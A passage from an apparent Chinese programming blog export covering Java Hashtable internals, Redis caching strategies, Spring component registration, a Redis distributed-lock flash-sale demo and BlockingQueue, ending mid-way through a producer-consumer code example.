跟HashMap相比，HashTable的get方法非常简单。我们首先可以看见get方法使用了synchronized来修饰，所以它能保证线程安全。并且它是通过链表的方式来处理冲突的。另外，我们还可以看见HashTable并没有像HashMap那样封装一个哈希函数，而是直接把哈希函数写在了方法中。而哈希函数也是比较简单的，它仅对哈希表的长度进行了取模。 5.2 put方法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public synchronized V put(K key, V value) &#123; // 确认value不为null if (value == null) &#123; throw new NullPointerException(); &#125; Entry&lt;?,?&gt; tab[] = table; int hash = key.hashCode(); //找到key在table中的索引 int index = (hash &amp; 0x7FFFFFFF) % tab.length; @SuppressWarnings("unchecked") //获取key所在索引的entry Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index]; //遍历entry，判断key是否已经存在 for(; entry != null ; entry = entry.next) &#123; //如果key已经存在 if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123; //保存旧的value V old = entry.value; //替换value entry.value = value; //返回旧的value return old; &#125; &#125; //如果key在hashtable不是已经存在，就直接将键值对添加到table中，返回null addEntry(hash, key, value, index); return null;&#125;private void addEntry(int hash, K key, V value, int index) &#123; modCount++; Entry&lt;?,?&gt; tab[] = table; //哈希表的键值对个数达到了阈值，则进行扩容 if (count &gt;= threshold) &#123; // Rehash the table if the threshold is exceeded rehash(); tab = table; hash = key.hashCode(); index = (hash &amp; 0x7FFFFFFF) % tab.length; &#125; // Creates the new entry. @SuppressWarnings("unchecked") Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;) tab[index]; //把新节点插入桶中（头插法） tab[index] = new Entry&lt;&gt;(hash, key, value, e); count++;&#125; 从代码中可以总结出Hashtable的put方法的总体思路： 确认value不为null。如果为null，则抛出异常 找到key在table中的索引，获取key所在位置的entry 遍历entry，判断key是否已经存在 如果key已经存在，替换value，返回旧的value 如果key在hashtable不是已经存在，就直接添加，否则直接将键值对添加到table中，返回null 在方法中可以看到，在遍历桶中元素时，是按照链表的方式遍历的。可以印证，HashMap的桶中可能为链表或者树。但Hashtable的桶中只可能是链表。 5.3 remove方法12345678910111213141516171819202122232425public synchronized V remove(Object key) &#123; Entry&lt;?,?&gt; tab[] = table; int hash = key.hashCode(); //计算key在hashtable中的索引 int index = (hash &amp; 0x7FFFFFFF) % tab.length; @SuppressWarnings("unchecked") Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index]; //遍历entry，如果entry中存在key为参数key的键值对，就删除键值对，并返回键值对的value for(Entry&lt;K,V&gt; prev = null ; e != null ; prev = e, e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; modCount++; if (prev != null) &#123; prev.next = e.next; &#125; else &#123; tab[index] = e.next; &#125; count--; V oldValue = e.value; e.value = null; return oldValue; &#125; &#125; //如果不存在key为参数key的键值对，返回value return null;&#125; 从代码中可以总结出Hashtable的remove方法的总体思路： 找到key在table中的索引，获取key所在位置的entry 遍历entry，判断key是否已经存在 如果key存在，删除key映射的键值对，返回旧的value 如果key在hashtable不存在，返回null 5.4 rehash方法1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * 增加hashtable的容量，为了更有效地存放和找到它的entry。 * 当键值对的数量超过了临界值（capacity*load factor）这个方法自动调用 * 长度变为原来的2倍+1 * */@SuppressWarnings("unchecked")protected void rehash() &#123; //记录旧容量 int oldCapacity = table.length; //记录旧桶的数组 Entry&lt;?,?&gt;[] oldMap = table; // overflow-conscious code //新的容量为旧的容量的2倍+1 int newCapacity = (oldCapacity &lt;&lt; 1) + 1; //如果新的容量大于容量的最大值MAX_ARRAY_SIZE if (newCapacity - MAX_ARRAY_SIZE &gt; 0) &#123; //如果旧容量为MAX_ARRAY_SIZE，容量不变，中断方法的执行 if (oldCapacity == MAX_ARRAY_SIZE) // Keep running with MAX_ARRAY_SIZE buckets return; //如果旧容量不为MAX_ARRAY_SIZE，新容量变为MAX_ARRAY_SIZE newCapacity = MAX_ARRAY_SIZE; &#125; //创建新的数组，容量为新容量 Entry&lt;?,?&gt;[] newMap = new Entry&lt;?,?&gt;[newCapacity]; //结构性修改次数+1 modCount++; //计算扩容的临界值 threshold = (int)Math.min(newCapacity * loadFactor, MAX_ARRAY_SIZE + 1); table = newMap; //将旧的数组中的键值对转移到新数组中 for (int i = oldCapacity ; i-- &gt; 0 ;) &#123; for (Entry&lt;K,V&gt; old = (Entry&lt;K,V&gt;)oldMap[i] ; old != null ; ) &#123; Entry&lt;K,V&gt; e = old; old = old.next; int index = (e.hash &amp; 0x7FFFFFFF) % newCapacity; e.next = (Entry&lt;K,V&gt;)newMap[index]; newMap[index] = e; &#125; &#125;&#125; 看完代码，我们可以总结出rehash的总体思路为： 新建变量新的容量，值为旧的容量的2倍+1 如果新的容量大于容量的最大值MAX_ARRAY_SIZE 如果旧容量为MAX_ARRAY_SIZE，容量不变，中断方法的执行 如果旧容量不为MAX_ARRAY_SIZE，新容量变为MAX_ARRAY_SIZE 创建新的数组，容量为新容量 将旧的数组中的键值对转移到新数组中 这里可以看到，一般情况下，HashMap扩容后容量变为原来的两倍，而Hashtable扩容后容量变为原来的两倍+1。 HashTable的rehash方法相当于HashMap的resize方法。跟HashMap那种巧妙的rehash方式相比，HashTable的rehash过程需要对每个键值对都重新计算哈希值，而比起异或和与操作，取模是一个非常耗时的操作，所以这也是导致效率较低的原因之一。 六、遍历1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public static void main(String[] args) &#123; Hashtable&lt;String,String&gt; table=new Hashtable&lt;String,String&gt;(); table.put("1", "value1"); table.put("2", "value2"); table.put("3", "value3"); table.put("4", "value4"); //第一种：普通使用，二次取值 System.out.println("\n通过keySet遍历key和value："); for(String key:table.keySet()) &#123; System.out.println("Key: "+key+" Value: "+table.get(key)); &#125; //第二种 System.out.println("\n通过entrySet使用iterator遍历key和value: "); Iterator&lt;Map.Entry&lt;String, String&gt;&gt; map1it=table.entrySet().iterator(); while(map1it.hasNext()) &#123; Map.Entry&lt;String, String&gt; entry= map1it.next(); System.out.println("Key: "+entry.getKey()+" Value: "+entry.getValue()); &#125; //第三种：推荐，尤其是容量大时 System.out.println("\n通过entrySet遍历key和value"); for(Map.Entry&lt;String, String&gt; entry: table.entrySet()) &#123; System.out.println("Key: "+ entry.getKey()+ " Value: "+entry.getValue()); &#125; //第四种 System.out.println("\n通过values()遍历所有的value，但不能遍历key"); for(String v:table.values()) &#123; System.out.println("The value is "+v); &#125; //第五种 System.out.println("\n通过Enumeration遍历所有的key"); Enumeration&lt;String&gt; enukey = table.keys(); while(enukey.hasMoreElements()) &#123; System.out.println(enukey.nextElement()); &#125; //第六种 System.out.println("\n通过Enumeration遍历所有的value"); Enumeration enuvalue = table.elements(); while(enuvalue.hasMoreElements()) &#123; System.out.println(enuvalue.nextElement()); &#125; &#125; 可以看到，可以使用与HashMap一样的遍历方式，但是由于历史原因，多了Enumeration的方式。 针对Enumeration，这里与iterator进行对比一下。相同点 Iterator和Enumeration都可以对某些容器进行遍历。 Iterator和Enumeration都是接口。 不同点 Iterator有对容器进行修改的方法。而Enumeration只能遍历。 Iterator支持fail-fast，而Enumeration不支持。 Iterator比Enumeration覆盖范围广，基本所有容器中都有Iterator迭代器，而只有Vector、Hashtable有Enumeration。 Enumeration在JDK 1.0就已经存在了，而Iterator是JDK2.0新加的接口。 七、Hashtable与HashMap对比HashTable的应用非常广泛，HashMap是新框架中用来代替HashTable的类，也就是说建议使用HashMap。 下面着重比较一下二者的区别：1.继承不同Hashtable是基于陈旧的Dictionary类的，HashMap是java1.2引进的Map接口的一个实现。 2.同步Hashtable 中的方法是同步的，保证了Hashtable中的对象是线程安全的。 HashMap中的方法在缺省情况下是非同步的,HashMap中的对象并不是线程安全的。在多线程并发的环境下，可以直接使用Hashtable，但是要使用HashMap的话就要自己增加同步处理了。 3.效率单线程中, HashMap的效率大于Hashtable。因为同步的要求会影响执行的效率，所以如果你不需要线程安全的集合，HashMap是Hashtable的轻量级实现，这样可以避免由于同步带来的不必要的性能开销，从而提高效率。 4.null值Hashtable中，key和value都不允许出现null值，否则出现NullPointerException。 在HashMap中，null可以作为键，这样的键只有一个；可以有一个或多个键所对应的值为null。当get()方法返回null值时，即可以表示 HashMap中没有该键，也可以表示该键所对应的值为null。因此，在HashMap中不能由get()方法来判断HashMap中是否存在某个键，而应该用containsKey()方法来判断。 5.遍历方式Hashtable、HashMap都使用了 Iterator。而由于历史原因，Hashtable还使用了Enumeration的方式。 6.容量Hashtable和HashMap它们两个内部实现方式的数组的初始大小和扩容的方式。 HashTable中hash数组默认大小是11，增加的方式是 old*2+1。 HashMap中hash数组的默认大小是16，而且一定是2的指数。 小结： 无论什么时候有多个线程访问相同实例的可能时，就应该使用Hashtable，反之使用HashMap。非线程安全的数据结构能带来更好的性能。 如果在将来有一种可能—你需要按顺序获得键值对的方案时，HashMap是一个很好的选择，因为有HashMap的一个子类 LinkedHashMap。所以如果你想可预测的按顺序迭代（默认按插入的顺序），你可以很方便用LinkedHashMap替换HashMap。反观要是使用的Hashtable就没那么简单了。同时如果有多个线程访问HashMap，Collections.synchronizedMap（）可以代替，总的来说HashMap更灵活。 参考： http://blog.csdn.net/panweiwei1994/article/details/77428710 http://blog.csdn.net/u013124587/article/details/52655042]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9.缓存设计与优化]]></title>
    <url>%2F2018%2F07%2F21%2F9.%E7%BC%93%E5%AD%98%E8%AE%BE%E8%AE%A1%E4%B8%8E%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[介绍redis缓存。 1. 缓存收益和成本1.1 收益 加速读写 降低后端负载(降低mysql负载) 1.2 成本 数据不一致：缓存层和数据层有时间窗口不一致，和更新策略有关 代码维护成本：多了一层缓存逻辑 运维成本：例如redis cluster 1.3 使用场景 降低后端负载：对于高消耗的SQL：join结果集、分组统计结果；对这些结果进行缓存。 加速请求响应 大量写合并为批量写：如计数器先redis累加再批量写入DB 2. 缓存的更新策略 LRU/LFU/FIFO算法剔除：例如maxmemory-policy FIFO(first in first out) 先进先出策略，最先进入缓存的数据在缓存空间不够的情况下（超出最大元素限制）会被优先被清除掉，以腾出新的空间接受新的数据。策略算法主要比较缓存元素的创建时间。在数据实效性要求场景下可选择该类策略，优先保障最新数据可用。 LFU(less frequently used) 最少使用策略，无论是否过期，根据元素的被使用次数判断，清除使用次数较少的元素释放空间。策略算法主要比较元素的hitCount（命中次数）。在保证高频数据有效性场景下，可选择这类策略。 LRU(least recently used) 最近最少使用策略，无论是否过期，根据元素最后一次被使用的时间戳，清除最远使用时间戳的元素释放空间。策略算法主要比较元素最近一次被get使用时间。在热点数据场景下较适用，优先保证热点数据的有效性。 超时剔除：例如expire 主动更新：开发控制生命周期（最终一致性，时间间隔比较短） 低一致性：最大内存和淘汰策略 高一致性：超时剔除和主动更新结合，最大内存和淘汰策略兜底。 3. 缓存粒度控制 缓存粒度控制三个角度 通用性：全量属性更好(添加删除属性不需要改东西) 占用空间：部分属性更好 代码维护：表面上全量属性更好(添加删除属性不需要改东西) 4. 缓存穿透优化定义大量请求不命中,缓存已经没有存在的意义了： 产生原因 业务代码自身问题 恶意攻击、爬虫等 如何发现 业务响应时间 业务本身问题 相关指标：总调用数、缓存层命中数、存储层命中数 解决方案 方案一：缓存空对象 存在的问题 需要更多的键:恶意攻击、爬虫会有很多乱七八糟的键，当量很大时，会有风险，所以会对这种空对象设置缓存时间控制风险 缓存层和存储层数据“短期”不一致：缓存了空对象，但是当业务恢复了，真实数据又存在于DB中了，那么在这个空对象过期时间内，取到的仍然是空对象，造成短期内数据不一致的问题。解决：可以订阅消息，当恢复正常后接受到消息，然后刷新缓存。 方案二：布隆过滤器拦截 什么是Bloom Filter？ 布隆过滤器（Bloom Filter）是1970年由布隆提出的, “a space-efficient probabilistic data structure”。它实际上是一个很长的二进制矢量和一系列随机映射函数。布隆过滤器可以用于检索一个元素是否在一个集合中。它的优点是空间效率和查询时间都远远超过一般的算法，缺点是有一定的误识别率和删除困难。 如果想判断一个元素是不是在一个集合里，一般想到的是将集合中所有元素保存起来，然后通过比较确定。链表、树、散列表（又叫哈希表，Hash table）等等数据结构都是这种思路。但是随着集合中元素的增加，我们需要的存储空间越来越大。同时检索速度也越来越慢，上述三种结构的检索时间复杂度分别为O(n),O(log n),O(n/k)。 布隆过滤器的原理是，当一个元素被加入集合时，通过K个散列函数将这个元素映射成一个位数组中的K个点，把它们置为1。 优点：相比于其它的数据结构，++布隆过滤器在空间和时间方面都有巨大的优势++。布隆过滤器存储空间和插入/查询时间都是常数（O（k））。另外, 散列函数相互之间没有关系，方便由硬件并行实现。布隆过滤器不需要存储元素本身，在某些对保密要求非常严格的场合有优势。布隆过滤器可以表示全集，其它任何数据结构都不能；k和m相同，使用同一组散列函数的两个布隆过滤器的交并差运算可以使用位操作进行。 缺点：但是布隆过滤器的缺点和优点一样明显。++误算率是其中之一++。随着存入的元素数量增加，误算率随之增加。但是如果元素数量太少，则使用散列表足矣。另外，++一般情况下不能从布隆过滤器中删除元素++。我们很容易想到把位数组变成整数数组，每插入一个元素相应的计数器加1,这样删除元素时将计数器减掉就可以了。然而要保证安全地删除元素并非如此简单。首先我们必须保证删除的元素的确在布隆过滤器里面。这一点单凭这个过滤器是无法保证的。另外计数器回绕也会造成问题。在降低误算率方面，有不少工作，使得出现了很多布隆过滤器的变种。 检索时，我们只要看看这些点是不是都是1就（大约）知道集合中有没有它了：++如果这些点有任何一个0，则被检元素一定不在；如果都是1，则被检元素很可能在++。这就是布隆过滤器的基本思想。 Bloom Filter应用场景？ 用Redis的Bitmap作为位数组构建起来的可扩展的布隆过滤器。 Redis实现的布隆过滤器如何快速有效删除数据？：EXPIRE “bitmap的key值” 0 解决方案对比 5. 无底洞问题优化问题描述 2010年，facebook有了3000个Memcache节点 发现问题：”加”机器性能没能提升，反而下降 问题原因当存在的节点异常多的时候，IO的代价已经超过数据传输，上文提到的facebook的节点已经超过3000个，在这种情况下再增加节点已经没法再提高效率了。 问题解决—优化IO 命令本身的效率：例如sql优化，命令优化 网络次数：减少通信次数 降低接入成本:长连/连接池,NIO等。 IO访问合并:O(n)到O(1)过程:批量接口(mget)，就是第八节文章中介绍的对于mget的四个方案。 6. 缓存雪崩优化什么是缓存雪崩？从下图可以很清晰出什么是缓存雪崩：由于缓存层承载着大量请求，有效的保护了存储层，但是如果缓存层由于某些原因整体不能提供服务，于是所有的请求都会达到存储层，存储层的调用量会暴增，造成存储层也会挂掉的情况。 缓存雪崩的英文原意是 stampeding herd（奔逃的野牛），指的是缓存层宕掉后，流量会像奔逃的野牛一样，打向后端存储。 如何防止缓存雪崩？ 保证缓存层服务高可用性。 和飞机都有多个引擎一样，如果缓存层设计成高可用的，即使个别节点、个别机器、甚至是机房宕掉，依然可以提供服务，例如前面介绍过的 Redis Sentinel 和 Redis Cluster 都实现了高可用。 依赖隔离组件为后端限流并降级 无论是缓存层还是存储层都会有出错的概率，可以将它们视同为资源。作为并发量较大的系统，假如有一个资源不可用，可能会造成线程全部 hang 在这个资源上，造成整个系统不可用。降级在高并发系统中是非常正常的：比如推荐服务中，如果个性化推荐服务不可用，可以降级补充热点数据，不至于造成前端页面是开天窗。 在实际项目中，我们需要对重要的资源 ( 例如 Redis、 MySQL、 Hbase、外部接口 ) 都进行隔离，让每种资源都单独运行在自己的线程池中，即使个别资源出现了问题，对其他服务没有影响。但是线程池如何管理，比如如何关闭资源池，开启资源池，资源池阀值管理，这些做起来还是相当复杂的，这里推荐一个 Java 依赖隔离工具 Hystrix。超出范围了。不再赘述。 7. 热点key重建优化问题热点key( 例如一个热门的娱乐新闻）+较长的重建时间（可能是一个复杂计算，例如复杂的 SQL、多次 IO、多个依赖等） 就是说在高并发的情况下，某个key在缓存中重建时间太长，以至于高并发下缓存查不到，都去DB进行查询。对于DB压力很大，并且响应时间长。 三个目标：要减少缓存重建次数、数据尽可能一致、减少潜在危险。 两个解决：互斥锁、永远不过期 互斥锁—setex,setnx 存在问题：有等待时间。 伪代码： (1) 从 Redis 获取数据，如果值不为空，则直接返回值，否则执行 (2.1) 和 (2.2)。 (2) 如果 set(nx 和 ex) 结果为 true，说明此时没有其他线程重建缓存，那么当前线程执行缓存构建逻辑。 (2.2) 如果 setnx(nx 和 ex) 结果为 false，说明此时已经有其他线程正在执行构建缓存的工作，那么当前线程将休息指定时间 ( 例如这里是 50 毫秒，取决于构建缓存的速度 ) 后，重新执行函数，直到获取到数据。 永远不过期 这里我想了很久到底是什么意思，，，我感觉这是一个场景：保证数据的定期更新。对于热点key,无非是并发特别大并且重建缓存时间比较长，如果直接设置过期时间，那么时间到的时候，巨大的访问量会压迫到数据库上，所以我们实际上，是不给他设置过期时间，但是不设置过期时间，怎么做到定时更新呢？这里的方案是给热点key的val增加一个逻辑过期时间字段，并发访问的时候，判断这个逻辑字段的时间值是否大于当前时间，大于了说明要对缓存进行更新了，那么这个时候，依然让所有线程访问老的缓存，因为缓存并没有设置过期，但是另开一个线程对缓存进行重构。等重构成功，即执行了redis set操作之后，所有的线程就可以访问到重构后的缓存中的新的内容了。不知道我的理解是不是正确。 “永远不过期”包含两层意思： 从缓存层面来看，确实没有设置过期时间，所以不会出现热点 key 过期后产生的问题，也就是“物理”不过期。 从功能层面来看，为每个 value 设置一个逻辑过期时间，当发现超过逻辑过期时间后，会使用单独的线程去构建缓存。 2018/6/19 号补充：物理上缓存确实是不过期的，保证所有线程都能访问到，但是有可能是老的数据；逻辑上给 value 增加过期时间，如果当过期时间超过当前时间(每一个线程拿缓存数据的时候都会判断一下，也就是说这里仍然使用互斥锁，其中一个线程发现过期时间超过当前时间了，那么锁住，另开一个线程去完成数据重建)，新开一个线程去构建缓存，构建成功之后，设置新内容到缓存中并且删除老缓存，就完成了热点 key 的重建。 伪代码实现： 两种方案对比]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9.组件注册总结]]></title>
    <url>%2F2018%2F07%2F21%2F9.%E7%BB%84%E4%BB%B6%E6%B3%A8%E5%86%8C%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[学习spring注解版来实现组件的注册。 给容器中注册组件： 包扫描+组件标注注解：@Controller，@Service，@Repository，@Component @Bean[导入第三方包里面的组件] @Import，快速给容器导入一个组件—重要 1).@Import(要导入到容器中的组件)；容器会自动注册这个组件，id默认是全类名 2).@ImportSelector：返回要导入的组件的全类名数组 3).@ImportBeanDefinitionRegistrar：手动注册bean到容器中 使用spring提供的@FactoryBean（工厂bean）来注册bean @Conditional按照条件注册bean—重要 @Scope作用域 懒加载]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9.redis分布式锁]]></title>
    <url>%2F2018%2F07%2F21%2F9.redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%2F</url>
    <content type="text"><![CDATA[慕课网微信点餐系统学习 做一个秒杀的案例1、秒杀的程序-controller123456789101112131415161718192021222324252627282930@RestController@RequestMapping("/skill")@Slf4jpublic class SeckillController &#123; @Autowired private SecKillService secKillService; /** * 查询秒杀的结果 * @param productId * @return * @throws Exception */ @GetMapping("/query/&#123;productId&#125;") public String query(@PathVariable String productId) throws Exception&#123; return secKillService.querySecKillProductInfo(productId); &#125; /** * 秒杀 * @param productId * @return * @throws Exception */ @GetMapping("/order/&#123;productId&#125;") public String skill(@PathVariable String productId) throws Exception&#123; secKillService.orderProductMockDiffUser(productId); return secKillService.querySecKillProductInfo(productId); &#125;&#125; 2、秒杀的程序-service12345678910111213141516171819202122232425262728293031323334353637383940414243444546@Service@Slf4jpublic class SecKillServiceImpl implements SecKillService&#123; static Map&lt;String,Integer&gt; products; static Map&lt;String,Integer&gt; stock; static Map&lt;String,String&gt; orders; static &#123; products = new HashMap&lt;&gt;(); stock = new HashMap&lt;&gt;(); orders = new HashMap&lt;&gt;(); products.put("123456",10000); stock.put("123456",10000); &#125; private String queryMap(String productId)&#123; return "国庆活动，皮蛋瘦肉粥特价，限量份"+products.get(productId) +",还剩:"+stock.get(productId) +";该商品成功下单的用户数量："+orders.size()+"人"; &#125; @Override public String querySecKillProductInfo(String productId) &#123; return this.queryMap(productId); &#125; @Override public void orderProductMockDiffUser(String productId) &#123; //1、查询库存，为0则活动结束 int stockNum = stock.get(productId); if(stockNum == 0)&#123; throw new SellException(100,"活动结束"); &#125;else &#123; //2、下单 orders.put(KeyUtil.genUniqueKey(),productId); //3、减库存 stockNum = stockNum - 1; try &#123; Thread.sleep(100); &#125;catch (InterruptedException e)&#123; e.printStackTrace(); &#125; stock.put(productId,stockNum); &#125; &#125;&#125; 3、访问秒杀： http://localhost:8080/sell/skill/order/123456 查询： http://localhost:8080/sell/skill/query/123456 刷新执行秒杀的页面，一切正常即可。也可以查询。 4、压测工具 apache ab 下载官网： http://httpd.apache.org/ 下载步骤： http://blog.csdn.net/ahaaaaa/article/details/51514175 解压，进入bin目录，打开黑窗口。执行： 1ab -n 100 -c 10 http://localhost:8080/sell/skill/order/123456 这里是说连续发送100个请求，10个进程同时执行，执行完毕，查看结果。发现好像没什么问题。 加大压力： 1ab -n 400 -c 100 http://localhost:8080/sell/skill/order/123456 这个时候就会发现成功下单的人数和剩下的份数之和是不等于总数的（一般是是大于：超卖现象）。 原因是进程多了，请求数多了，这个程序已经打架了，多个进程竞争同一个资源，怎么会不乱呢？ 大家会想到用 synchronized 关键字，对其上锁，但是问题是虽然可以保证同一时间只有一个线程在执行任务，但是明显发现速度好慢好慢，对于这种秒杀的场景显然是不适用的。 5、redis分布式锁首先是安装redis（略） 然后启动redis服务端 程序引入依赖： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt; 配置： 123redis: host: 127.0.0.1 port: 6379 锁： 123456789101112131415161718192021222324252627282930313233343536373839404142@Component@Slf4jpublic class RedisLock &#123; @Autowired private StringRedisTemplate redisTemplate; /** * 加锁 * value:当前时间+超时时间 */ public Boolean lock(String key, String value)&#123; if(redisTemplate.opsForValue().setIfAbsent(key,value))&#123; return true; &#125; String currentValue = redisTemplate.opsForValue().get(key); /*如果锁过期*/ if(!StringUtils.isEmpty(currentValue) &amp;&amp; Long.parseLong(currentValue) &lt; System.currentTimeMillis())&#123; //获取上一个锁的时间 String oldValue = redisTemplate.opsForValue().getAndSet(key,value); if(!StringUtils.isEmpty(oldValue) &amp;&amp; oldValue.equals(currentValue))&#123; return true; &#125; &#125; return false; &#125; /** * 解锁 */ public void unlock(String key,String value)&#123; try &#123; String currentValue = redisTemplate.opsForValue().get(key); if(!StringUtils.isEmpty(currentValue) &amp;&amp; currentValue.equals(value))&#123; redisTemplate.opsForValue().getOperations().delete(key); &#125; &#125; catch (Exception e) &#123; log.error("【redis分布式锁解锁异常】:&#123;&#125;",e); e.printStackTrace(); &#125; &#125;&#125; 首先是判断有没有已经存在的key-value，有的话，仍然被锁住。 如果程序中出现异常，无法正常执行解锁操作，会造成死锁的情况。 所以还需要判断超时时间，如果达到超时时间了，就会用 getAndSet 将这个进程放进去，就会被新的线程锁住。 秒杀的那一段程序： 12345678910111213141516171819202122232425262728@Overridepublic void orderProductMockDiffUser(String productId) &#123; //加锁 long time = System.currentTimeMillis() + TIMEOUT; if(!redisLock.lock(productId,String.valueOf(time)))&#123; throw new SellException(101,"哎哟喂，人太多，换个姿势再试试"); &#125; //1、查询库存，为0则活动结束 int stockNum = stock.get(productId); if(stockNum == 0)&#123; throw new SellException(100,"活动结束"); &#125;else &#123; //2、下单 orders.put(KeyUtil.genUniqueKey(),productId); //3、减库存 stockNum = stockNum - 1; try &#123; Thread.sleep(100); &#125;catch (InterruptedException e)&#123; e.printStackTrace(); &#125; stock.put(productId,stockNum); &#125; //解锁 redisLock.unlock(productId,String.valueOf(time));&#125; 跟上面一样进行压力测试，速度还是很快的，而且保证不会出现数字的混乱。达到了快速的锁的要求。]]></content>
      <tags>
        <tag>微信点餐系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9.JUC组件拓展-BlockingQueue]]></title>
    <url>%2F2018%2F07%2F21%2F9.JUC%E7%BB%84%E4%BB%B6%E6%8B%93%E5%B1%95-BlockingQueue%2F</url>
    <content type="text"><![CDATA[在Java中，BlockingQueue是一个接口，它的实现类有ArrayBlockingQueue、DelayQueue、 LinkedBlockingDeque、LinkedBlockingQueue、PriorityBlockingQueue、SynchronousQueue等，它们的区别主要体现在存储结构上或对元素操作上的不同，但是对于take与put操作的原理，却是类似的。 BlockingQueue BlockingQueue 是一个先进先出的队列（Queue），为什么说是阻塞（Blocking）的呢？是因为 BlockingQueue 支持当获取队列元素但是队列为空时，会阻塞等待队列中有元素再返回；也支持添加元素时，如果队列已满，那么等到队列可以放入新元素时再放入。 add(anObject):把anObject加到BlockingQueue里,即如果BlockingQueue可以容纳,则返回true,否则抛出异常 offer(anObject):表示如果可能的话,将anObject加到BlockingQueue里,即如果BlockingQueue可以容纳,则返回true,否则返回false. put(anObject):把anObject加到BlockingQueue里,如果BlockQueue没有空间,则调用此方法的线程被阻断直到BlockingQueue里面有空间再继续. poll(time):取走BlockingQueue里排在首位的对象,若不能立即取出,则可以等time参数规定的时间,取不到时返回null take():取走BlockingQueue里排在首位的对象,若BlockingQueue为空,阻断进入等待状态直到Blocking有新的对象被加入为止 注意：BlockingQueue 不接受null 元素。试图add、put 或offer 一个null 元素时，某些实现会抛出NullPointerException。null 被用作指示poll 操作失败的警戒值。 BlockingQueue 的各个实现都遵循了这些规则，当然我们也不用死记这个表格，知道有这么回事，然后写代码的时候根据自己的需要去看方法的注释来选取合适的方法即可。 一个 BlockingQueue 可能是有界的，如果在插入的时候，发现队列满了，那么 put 操作将会阻塞。通常，在这里我们说的无界队列也不是说真正的无界，而是它的容量是 Integer.MAX_VALUE（21亿多）。 BlockingQueue 实现主要用于生产者-使用者队列，但它另外还支持Collection 接口。因此，举例来说，使用remove(x) 从队列中移除任意一个元素是有可能的。然而，这种操作通常不 会有效执行，只能有计划地偶尔使用，比如在取消排队信息时。 BlockingQueue 的实现都是线程安全的，但是批量的集合操作如 addAll, containsAll, retainAll 和 removeAll 不一定是原子操作。如 addAll(c) 有可能在添加了一些元素后中途抛出异常，此时 BlockingQueue 中已经添加了部分元素，这个是允许的，取决于具体的实现。 BlockingQueue 的实现类1. ArrayBlockingQueue 构造函数必须带一个int参数来指明其大小 一个由数组结构组成的有界阻塞队列. 此队列按 FIFO（先进先出）原则对元素进行排序. 其并发控制采用可重入锁来控制，不管是插入操作还是读取操作，都需要获取到锁才能进行操作。 如果队列为空，这个时候读操作的线程进入到读线程队列排队，等待写线程写入新的元素，然后唤醒读线程队列的第一个等待线程。 如果队列已满，这个时候写操作的线程进入到写线程队列排队，等待读线程将队列元素移除腾出空间，然后唤醒写线程队列的第一个等待线程。 支持公平锁和非公平锁。【注：每一个线程在获取锁的时候可能都会排队等待，如果在等待时间上，先获取锁的线程的请求一定先被满足，那么这个锁就是公平的。反之，这个锁就是不公平的。公平的获取锁，也就是当前等待时间最长的线程先获取锁】 2. LinkedBlockingQueue 大小不定的BlockingQueue 若其构造函数带一个规定大小的参数,生成的BlockingQueue有大小限制 若不带大小参数,所生成的BlockingQueue的大小由Integer.MAX_VALUE来决定 其所含的对象是以FIFO(先入先出)顺序排序的 链接队列的吞吐量通常要高于基于数组的队列，但是在大多数并发应用程序中，其可预知的性能要低 最新插入的数据在尾部，最新移除的对象在头部 3. PriorityBlockingQueue 类似于LinkedBlockQueue,但其所含对象的排序不是FIFO,而是依据对象的自然排序顺序或者是构造函数的Comparator决定的顺序 一个无界的阻塞队列 4. SynchronousQueue 它是一种阻塞队列，其中每个 put 必须等待一个 take，反之亦然。 同步队列没有任何内部容量，甚至连一个队列的容量都没有。 它是线程安全的，是阻塞的。 不允许使用 null 元素。 公平排序策略是指调用 put 的线程之间，或 take 的线程之间。 一个没有容量的并发队列有什么用了？或者说存在的意义是什么？ 尽管元素在SynchronousQueue 内部不会“停留”，但是并不意味着SynchronousQueue 内部没有队列。实际上SynchronousQueue 维护着线程队列，也就是插入线程或者移除线程在不同时存在的时候就会有线程队列。既然有队列，同样就有公平性和非公平性特性，公平性保证正在等待的插入线 程或者移除线程以FIFO的顺序传递资源。 它模拟的功能类似于生活中一手交钱一手交货这种情形，像那种货到付款或者先付款后发货模型不适合使用SynchronousQueue。首先要知道SynchronousQueue没有容纳元素的能力，即它的isEmpty()方法总是返回true，但是给人的感觉却像是只能容纳一个元素。 5. DelayQueue DelayQueue 对元素进行持有直到一个特定的延迟到期。注意其中的元素必须实现 java.util.concurrent.Delayed 接口。 生产者与消费者模式阻塞队列的最常使用的例子就是生产者消费者模式,也是各种实现生产者消费者模式方式中首选的方式。使用者不用关心什么阻塞生产，什么时候阻塞消费，使用非常方便。 LinkedBlockingQueue来实现一个生产者与消费者模型：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576public class BlockingQueueTest &#123; //生产者 public static class Producer implements Runnable&#123; private final BlockingQueue&lt;Integer&gt; blockingQueue; private volatile boolean flag; private Random random; public Producer(BlockingQueue&lt;Integer&gt; blockingQueue) &#123; this.blockingQueue = blockingQueue; flag=false; random=new Random(); &#125; public void run() &#123; while(!flag)&#123; int info=random.nextInt(100); try &#123; blockingQueue.put(info); System.out.println(Thread.currentThread().getName()+" produce "+info); Thread.sleep(50); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; public void shutDown()&#123; flag=true; &#125; &#125; 